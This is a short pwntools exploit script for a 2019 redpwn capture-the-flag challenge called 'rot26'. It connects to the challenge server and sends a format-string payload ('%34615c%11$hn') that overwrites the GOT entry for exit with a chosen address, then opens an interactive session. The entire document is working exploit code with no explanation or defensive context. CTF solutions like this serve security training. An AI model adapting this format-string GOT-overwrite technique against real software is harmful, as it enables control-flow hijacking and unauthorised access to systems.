from pwn import *

exit_got = 0x804a020
target = 0x8048737


r = remote('chall.2019.redpwn.net',4003)
#r = process('./rot26')

payload = b'%34615c%11$hn'.ljust(0x10,b'a')+p32(exit_got)
print(payload)
#payload = b'%11$p'.ljust(0x10,b'a')+p32(target)

r.sendline(payload)
r.interactive()
